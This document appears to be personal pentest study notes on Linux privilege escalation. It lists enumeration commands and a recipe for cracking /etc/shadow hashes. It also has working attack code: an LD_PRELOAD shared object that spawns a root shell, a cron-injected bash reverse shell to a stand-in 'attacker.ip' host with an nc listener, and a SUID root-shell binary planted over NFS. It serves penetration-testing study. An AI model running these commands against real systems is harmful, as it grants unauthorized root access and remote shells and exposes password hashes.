[[Pentest/LPE/Linux]] [[LPE]]
#### Enumeration
* `hostname`
* `uname -a`
* `cat /proc/version`
* `cat /etc/issue`
* `ps -A`
* `ps axjf` - tree view
* `ps aux` - all processes
* `env`
* `sudo -l`
* `id <username>`
* `cat /etc/passwd` - list of users
* `cat /etc/shadow` - password hashes
	* `unshadow /etc/passwd /etc/shadow > combined.txt`
	* `jonh --wordlist=/usr/share/wordlists/rockyou.txt combined.txt`
	   * Detect hash type in `/etc/shadow` using `grep ENCRYPT_METHOD /etc/login.defs`
	   * `hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` [[hashcat]]
    
* `history`
* `ifconfig`
* `ip route`
* `netstat -a` - all open ports, `netstat -at` or `netstat -au` - tcp/udp, `nestat -l` - listening mode
* `netstat -tp`: list connections with the service name and PID information
* `find / -writable -type d 2>/dev/null` : Find world-writeable folders
* `find / -perm -o x -type d 2>/dev/null` : Find world-executable folders
* `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit
##### Automated tools
- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

`wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
#### Kernel exploits
* https://github.com/The-Z-Labs/linux-exploit-suggester
* https://www.cvedetails.com/
* https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
#### sudo
* run `sudo -l`
* Check binaries at https://gtfobins.github.io/

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
	```c
#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/

#### SUID
[[suid]]
1. c will list files that have SUID or SGID bits set.
2. Check gtfobins

#### Capabilities
1. `getcap -r / 2>/dev/null`
2. Check gtfobins

#### Cron
[[cron]]
1. `cat /etc/crontab`
2. Modify available cron script and add your code there: 
```bash
bash -i >& /dev/tcp/attacker.ip/6666 0>&1   
```
3. Listen on attacker machine: `nc -nlvp 6666`

#### PATH
 If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
1. What folders are located under $PATH
2. Does your current user have write privileges for any of these folders?
3. Can you modify $PATH?
4. Is there a script/application you can start that will be affected by this vulnerability?
![[Pasted image 20250118162215.png]]
Find writable dirs:
`find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u`
![[Pasted image 20250118162417.png]]
![[Pasted image 20250118162441.png]]

#### NFS
[[NFS]]
List mountable devices `cat /etc/exports`

On attacker machine: 
`showmount -e <ip>`
`mount -o rw <ip>:/backups /tmp/bd`

Create executable with SUID set and run on attacker machine:
```c
int main(){
setgid(0);
setuid(0);
system("/bin/bash");
return 0;
}
```

## tar unarchive wildcard
https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com

Discover open ports and services:
```shell
netstat -tulpn | grep LISTEN
```
or
`ss -tl`
## Misc
* `ss -tunlp` to find hidden ports [[ss]]
* sudo -l
* crontabs
* winpeas & inpeas 